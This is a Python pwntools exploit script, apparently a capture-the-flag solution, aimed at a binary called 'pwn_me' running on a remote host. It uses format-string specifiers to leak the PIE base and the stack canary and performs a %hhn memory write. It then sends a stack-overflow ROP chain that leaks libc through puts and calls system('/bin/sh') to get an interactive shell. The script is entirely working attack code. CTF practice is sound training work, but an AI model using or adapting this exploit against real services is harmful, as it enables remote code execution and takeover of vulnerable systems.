from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './pwn_me'
e = ELF(file)
libc = e.libc
ip = '183.129.189.60'
port = '10027'
local = 0


def dbg(code=""):
    if local == 0:
        return
    gdb.attach(p, code)


def run():
    global p
    if local == 1:
        p = process(file)
    else:
        p = remote(ip, port)


se = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sea = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda: p.recv(timeout=0.5)
ru = lambda x: p.recvuntil(x, drop=True)
rn = lambda x: p.recv(x)
shell = lambda: p.interactive()
un64 = lambda x: u64(x.ljust(8, '\x00'))
un32 = lambda x: u32(x.ljust(4, '\x00'))

run()
ru('key~')
sl('[m]')
ru('enter:')
sl('1')
ru('g?: \n')
sl('%20$p')
pie = int(ru('\n'), 16) - 0x15f0
e.address = pie
print hex(pie)
# dbg('breakrva 0x1401')
ru('n?')
se('%17$p%101c%8$hhn'.ljust(0x10, '\x00') + p64(pie + 0x202010))
canary = int(ru(' '), 16)
print hex(canary)
rc()
sl(str(0x99999))
prdi = pie + 0x1653
rc()
rop_chain = 'a' * 0x258 + p64(canary) + p64(0) + p64(prdi) + p64(
    e.got['puts']) + p64(e.plt['puts']) + p64(pie + 0xb60)
rop_chain = list(rop_chain)
rop_chain[0x58] = 'Z'
rop_chain[0x7f] = 'X'
rop_chain[0x89] = 'Z'
rop_chain[0x9a] = 'l'
rop_chain = ''.join(rop_chain)
# dbg('breakrva 0x11E9')
sl(rop_chain)
ru('this?!\n')
sl(str(0x80000000))
ru('hhh')
sl(rop_chain[0:0x100])
ru('~\n')
libc.address = un64(rn(6)) - libc.symbols['puts']
print hex(libc.address)
rc()
sl(str(0x99999))
prdi = pie + 0x1653
rc()
rop_chain = 'a' * 0x258 + p64(canary) + p64(0) + p64(prdi) + p64(
    next(libc.search('/bin/sh'))) + p64(libc.symbols['system'])
rop_chain = list(rop_chain)
rop_chain[0x58] = 'Z'
rop_chain[0x7f] = 'X'
rop_chain[0x89] = 'Z'
rop_chain[0x9a] = 'l'
rop_chain = ''.join(rop_chain)
sl(rop_chain)
rc()
sl(str(0x80000000))
rc()
dbg('breakrva 0xCFE')
sl(rop_chain[0:0x100])
shell()